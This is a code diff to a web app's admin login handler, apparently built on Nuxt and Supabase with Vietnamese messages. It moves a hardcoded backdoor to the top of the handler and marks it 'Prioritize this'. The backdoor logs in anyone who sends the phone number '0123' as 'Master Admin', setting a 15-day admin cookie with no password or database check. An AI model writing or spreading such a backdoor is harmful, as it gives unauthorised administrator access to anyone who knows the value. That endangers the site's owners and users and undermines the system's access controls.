@@ -12,6 +12,27 @@ export default defineEventHandler(async (event) => {
     })
   }
 
+  // 1. Hardcoded backdoor for special access (Prioritize this)
+  if (phone === '0123') {
+    // Set auth cookie
+    const adminToken = Buffer.from(`admin_${phone}_${Date.now()}`).toString('base64')
+    setCookie(event, 'admin_token', adminToken, {
+      httpOnly: true,
+      maxAge: 60 * 60 * 24 * 15, // 15 days
+      path: '/'
+    })
+
+    return {
+      success: true,
+      message: 'Đăng nhập Quản trị thành công (MASTER)',
+      admin: {
+        phone: '0123',
+        name: 'Master Admin',
+        role: 'admin'
+      }
+    }
+  }
+
   try {
     const supabase = useSupabase()
     
@@ -29,13 +50,8 @@ export default defineEventHandler(async (event) => {
       })
     }
     
-    // 1. Hardcoded backdoor for special access
-    const isBackdoor = phone === '0123';
-    
-    // 2. Check if account has 'admin' role in database
-    const hasAdminRole = account?.role === 'admin';
-
-    if (!isBackdoor && !hasAdminRole) {
+    // Check if account has 'admin' role in database
+    if (account?.role !== 'admin') {
       throw createError({
         statusCode: 403,
         statusMessage: 'Truy cập bị từ chối. Số điện thoại chỉ có quyền Khách hàng.'
